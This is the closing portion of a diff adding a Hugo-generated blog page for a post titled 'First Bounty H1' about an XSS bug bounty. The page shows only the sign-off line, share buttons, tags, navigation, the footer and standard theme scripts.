+<p><em>Stay curious, stay secure! 🔒</em></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-07-24</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/posts/updated-first-bounty-h1/" data-title="First Bounty H1" data-via="Benhibafodhil" data-hashtags="xss,bug bounty,web security"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/posts/updated-first-bounty-h1/" data-title="First Bounty H1"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/updated-first-bounty-h1/" data-hashtag="xss"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/updated-first-bounty-h1/" data-title="First Bounty H1"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/posts/updated-first-bounty-h1/" data-title="First Bounty H1"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/updated-first-bounty-h1/" data-title="First Bounty H1" data-image="/images/first-report.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/posts/updated-first-bounty-h1/" data-title="First Bounty H1" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fupdated-first-bounty-h1%2f&amp;text=First%20Bounty%20H1" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/xss/">Xss</a>,&nbsp;<a href="/tags/bug-bounty/">Bug Bounty</a>,&nbsp;<a href="/tags/web-security/">Web Security</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/posts/first-bounty-h1/" class="next" rel="next" title="First Bounty H1">First Bounty H1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">F0DH1L</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/css/custom.css"><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
